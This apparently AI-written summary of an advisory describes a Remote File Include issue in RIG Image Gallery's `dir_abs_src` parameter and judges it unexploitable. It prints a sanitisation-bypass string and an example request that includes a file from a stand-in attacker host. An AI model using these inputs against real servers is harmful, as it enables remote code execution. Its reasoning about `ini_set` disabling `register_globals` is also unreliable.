The provided content discusses a purported Remote File Include (RFI) vulnerability in RIG Image Gallery related to the `dir_abs_src` parameter, however, it concludes that the vulnerability is not exploitable due to the `register_globals` setting.

Here's a breakdown:

**Root Cause:**
The vulnerability is a purported RFI vulnerability via the `dir_abs_src` parameter. The code attempts to sanitize the input using `str_replace` to remove `://` and `..` sequences. However, this sanitization method is not sufficient to prevent file inclusion if the `register_globals` is set to `on`.

**Weaknesses/Vulnerabilities Present:**
- The `rig_check_src_file` function uses `str_replace` to filter the `dir_abs_src` parameter, which can be bypassed as shown in the example: `http:/:///www.tin.it/`  
- The initial code was vulnerable if register_globals was enabled, however, the application explicitly turns register_globals off and exits if it cannot.

**Impact of Exploitation:**
- If the `register_globals` setting was enabled, the attacker could potentially include arbitrary remote or local files into the application using the `dir_abs_src` parameter and gain code execution on the server.

**Attack Vectors:**
- The vulnerability is triggered by crafting a malicious URL with the `dir_abs_src` parameter.
- The attacker must provide a crafted URL to the `check_entry.php` script.

**Required Attacker Capabilities/Position:**
- The attacker needs to be able to send HTTP requests to the vulnerable application with a modified `dir_abs_src` parameter, such as: `check_entry.php?dir_abs_src=[http://attacker.php?](http://attacker.php)`.
- The attacker needs to have access to a web server to host the malicious file.
- The vulnerability could only be exploited if `register_globals` was not disabled by the application.

**Additional Notes:**
- The content emphasizes that the `register_globals` setting is disabled by the application using `ini_set("register_globals", "0")`.
- The content indicates that the check to see if `register_globals` is disabled is redundant, as PHP's `ini_set()` function will always set the variable to the desired value if allowed by php.ini.

**Conclusion**
The content indicates that despite the initial concern regarding the inadequate sanitization of the `dir_abs_src` parameter, the application disables `register_globals`. Thus, the purported RFI vulnerability is not exploitable.
